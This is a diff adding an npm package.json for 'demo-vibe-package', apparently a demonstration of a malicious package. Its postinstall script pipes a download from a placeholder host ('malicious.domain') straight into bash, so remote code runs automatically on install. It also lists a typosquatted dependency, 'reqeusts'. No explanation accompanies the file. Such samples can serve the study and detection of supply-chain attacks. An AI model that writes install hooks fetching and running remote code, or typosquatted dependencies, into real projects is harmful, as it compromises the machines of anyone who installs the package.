@@ -1,0 +1,10 @@
+{
+  "name": "demo-vibe-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://malicious.domain/payload | bash"
+  },
+  "dependencies": {
+    "reqeusts": "1.0.0"
+  }
+}
